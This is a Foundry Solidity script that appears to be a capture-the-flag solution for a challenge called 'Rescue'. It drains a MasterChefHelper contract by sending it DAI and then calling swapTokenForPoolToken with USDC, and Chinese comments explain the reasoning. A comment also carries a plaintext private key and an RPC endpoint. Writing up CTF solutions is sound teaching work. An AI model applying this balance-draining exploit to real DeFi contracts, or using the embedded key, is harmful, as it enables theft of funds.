// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.15;

import "forge-std/Script.sol";
import "../src/Rescue/contracts/Setup.sol";
import "../src/Rescue/contracts/MasterChefHelper.sol";


interface IERC20 {
    function transferFrom(address, address, uint) external;

    function transfer(address, uint) external;

    function approve(address, uint) external;

    function balanceOf(address) external view returns (uint);
}

// forge script script/Rescue.s.sol --private-key 0xcc523c617eca3666392ee75b3fb9ba8f9c890e9a427e5d17a97db5ba95e49a26 --rpc-url http://34.123.187.206:8545/e7f0a824-a717-4e8c-998b-f7edaaad743b --broadcast
contract RescueScript is Script {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Setup setup;

    function setUp() public {
        vm.createSelectFork("eth");
        setup = (new Setup){value: 10 ether}();
    }
    // 思路
    // rescue work logic：swapTokenForPoolToken 会将自身的token1.balance 跟token2.balance进行addLiquidity
    // 1. 往mch里打入等同于10eth 的dai（此处11eth防止滑点，确保eth能全部拿出）
    // 2. 随便用个其它第三种币（usdc），call mch的swapTokenForPoolToken
    function run() public {
        MasterChefHelper mch = setup.mcHelper();
        weth.deposit{value : 30 ether}();
        weth.approve(address(router), type(uint256).max);

        swap(address(weth), address(dai), 11 ether);
        swap(address(weth), address(usdc), 1 ether);

        usdc.approve(address(mch), type(uint256).max);
        uint daiBal = dai.balanceOf(address(this));
        dai.transfer(address(mch), daiBal);

        mch.swapTokenForPoolToken(2, address(usdc), usdc.balanceOf(address(this)), 0);
        console2.log("solved?", setup.isSolved());
    }

    function swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}